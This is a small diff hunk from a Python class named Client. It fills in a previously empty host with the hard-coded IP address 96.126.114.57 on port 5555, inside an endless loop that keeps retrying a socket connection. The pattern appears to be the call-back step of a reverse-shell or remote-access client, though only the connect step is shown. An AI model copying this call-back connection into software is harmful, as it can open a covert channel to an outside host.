@@ -10,7 +10,7 @@ class Client:
         
         while 1:
             try:
-                host = ''
+                host = '96.126.114.57'
                 port = 5555
                 self.s.connect((host,port))
                 
